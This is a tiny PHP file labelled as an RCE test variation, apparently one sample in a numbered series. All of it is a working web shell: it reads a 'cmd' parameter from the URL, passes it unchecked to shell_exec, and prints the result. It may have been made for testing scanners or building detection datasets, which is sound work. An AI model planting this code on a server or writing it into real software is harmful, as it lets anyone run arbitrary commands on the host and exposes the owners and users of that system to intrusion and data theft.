<?php
// RCE test variation #389
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>